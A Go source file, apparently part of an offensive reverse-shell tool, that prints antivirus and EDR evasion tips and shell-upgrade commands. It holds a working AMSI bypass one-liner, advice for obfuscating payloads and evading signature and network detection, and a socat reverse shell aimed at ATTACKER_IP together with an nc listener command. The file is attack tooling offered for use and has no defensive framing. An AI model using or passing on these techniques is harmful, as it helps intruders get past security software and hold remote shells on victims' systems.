package main

import (
	"fmt"
	"strings"
)

type Suggestion struct {
	Title   string
	Content string
}

func GetAVBypassSuggestions(pType string) []Suggestion {
	pType = strings.ToLower(pType)
	var tips []Suggestion

	if strings.Contains(pType, "powershell") || strings.Contains(pType, "ps") {
		tips = append(tips, Suggestion{
			Title:   "PowerShell AMSI Bypass",
			Content: "Use the built-in AMSI-bypass variant or add: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
		})
		tips = append(tips, Suggestion{
			Title:   "PowerShell Logging Bypass",
			Content: "Disable transcription/logging: $Setting = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name 'EnableTranscripting' -ErrorAction SilentlyContinue",
		})
		tips = append(tips, Suggestion{
			Title:   "Invoke-Obfuscation",
			Content: "Consider running payload through Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation) for dynamic token-level obfuscation",
		})
	}

	if strings.Contains(pType, "python") {
		tips = append(tips, Suggestion{
			Title:   "Python PyArmor",
			Content: "Obfuscate Python payloads with PyArmor or base64-encode with random padding: exec(base64.b64decode('...'))",
		})
	}

	if strings.Contains(pType, "bash") || strings.Contains(pType, "sh") {
		tips = append(tips, Suggestion{
			Title:   "Bash String Evasion",
			Content: "Use environment variable splitting: $0=bas\\$@h; /$0 -c 'payload' (breaks simple signature matching)",
		})
	}

	tips = append(tips, Suggestion{
		Title:   "General AV Evasion",
		Content: "Consider tunneling through HTTPS (e.g., using ncat --ssl or socat with OpenSSL) to evade network-based detection",
	})

	return tips
}

func GetShellUpgradeSuggestions() []Suggestion {
	return []Suggestion{
		{
			Title:   "Python PTY Spawn",
			Content: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
		},
		{
			Title:   "Python PTY Spawn (fallback)",
			Content: "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
		},
		{
			Title:   "Script-based PTY",
			Content: "/usr/bin/script -qc /bin/bash /dev/null",
		},
		{
			Title:   "Socat PTY Forward",
			Content: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT",
		},
		{
			Title:   "STTY Magic (full TTY)",
			Content: "Ctrl+Z -> stty raw -echo; fg -> reset -> export SHELL=bash -> export TERM=xterm-256color -> stty rows 38 columns 116",
		},
		{
			Title:   "rlwrap Listener (recomended)",
			Content: "Use: rlwrap nc -lvnp PORT  (provides history, tab completion, arrow keys)",
		},
	}
}

func PrintSuggestions(pType string, port int) {
	tips := GetAVBypassSuggestions(pType)
	upgrades := GetShellUpgradeSuggestions()

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("[+] AV/EDR Bypass Suggestions:")
	fmt.Println(strings.Repeat("-", 60))
	for _, t := range tips {
		fmt.Printf("  * %s:\n    %s\n\n", t.Title, t.Content)
	}

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("[+] Shell Upgrade Commands:")
	fmt.Println(strings.Repeat("-", 60))
	for _, u := range upgrades {
		fmt.Printf("  * %s:\n    %s\n\n", u.Title, u.Content)
	}

	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("[+] Listener Commands:")
	fmt.Println(strings.Repeat("-", 60))
	fmt.Println(SuggestListeners(port))
	fmt.Println()
}
